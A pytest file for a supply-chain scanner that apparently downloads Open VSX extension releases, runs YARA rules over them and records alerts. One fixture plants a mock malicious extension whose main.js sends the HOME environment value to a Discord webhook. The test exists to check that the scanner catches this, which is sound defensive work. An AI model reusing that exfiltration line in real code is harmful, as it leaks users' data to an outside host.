import io
import json
import zipfile

import pytest

import soc_store
from secopsai import research_content_funnel, yara_engine
from secopsai.research_intake import SafeFetcher

pytest.importorskip("yara_x")


def _seed(db_path, ecosystem, package, version):
    from secopsai.research_surveillance import ensure_collectors

    collector = next(item for item in ensure_collectors(db_path=db_path) if item["ecosystem"] == ecosystem)
    with soc_store.connect(db_path) as connection:
        connection.execute("INSERT INTO registry_feed_events (feed_event_id, collector_id, ecosystem, package, version, event_type, registry_timestamp, page_url, leaf_url, metadata_json, idempotency_key, collected_at, processing_state) VALUES (?, ?, ?, ?, ?, 'version_updated', '2026-10-10T00:00:00Z', '', '', '{}', ?, 't', 'pending')",
                           (f"E-{package}", collector["collector_id"], ecosystem, package, version, f"k-{package}"))


def _vsix(files):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        for name, data in files.items():
            archive.writestr(name, data)
    return buffer.getvalue()


def test_open_vsx_release_is_downloaded_scanned_and_alerted(tmp_path):
    db_path = str(tmp_path / "soc.db")
    _seed(db_path, "open-vsx", "evil/theme", "1.0.0")
    _seed(db_path, "open-vsx", "good/theme", "2.0.0")
    blobs = {
        "https://open-vsx.org/api/evil/theme/1.0.0": json.dumps({"files": {"download": "https://open-vsx.org/api/evil/theme/1.0.0/file/x.vsix"}}).encode(),
        "https://open-vsx.org/api/evil/theme/1.0.0/file/x.vsix": _vsix({"extension/out/main.js": b"require('https').request('https://discord.com/api/webhooks/1/x',{method:'POST'}).end(process.env.HOME)"}),
        "https://open-vsx.org/api/good/theme/2.0.0": json.dumps({"files": {"download": "https://open-vsx.org/api/good/theme/2.0.0/file/y.vsix"}}).encode(),
        "https://open-vsx.org/api/good/theme/2.0.0/file/y.vsix": _vsix({"extension/package.json": b"{}", "extension/themes/dark.json": b"{}"}),
    }
    fetcher = SafeFetcher(fetch=lambda url, _max: (200, {"content-type": "application/octet-stream"}, blobs[url]))
    stats = research_content_funnel.run(db_path=db_path, fetcher=fetcher, limit=10)
    assert stats["open-vsx"]["scanned"] == 2 and stats["open-vsx"]["hits"] == 1 and stats["open-vsx"]["clean"] == 1
    with soc_store.connect(db_path) as connection:
        alert = connection.execute("SELECT alert_type, evidence_json FROM research_alerts").fetchone()
        states = dict(connection.execute("SELECT package, json_extract(metadata_json, '$.content_prescan.status') FROM registry_feed_events").fetchall())
    assert alert["alert_type"] == "registry_release_anomaly" and "BEH_DISCORD_WEBHOOK" in json.loads(alert["evidence_json"])["rules"]
    assert states == {"evil/theme": "hit", "good/theme": "clean"}
    assert research_content_funnel.run(db_path=db_path, fetcher=fetcher, limit=10)["open-vsx"]["scanned"] == 0, "scanned releases are not rescanned"
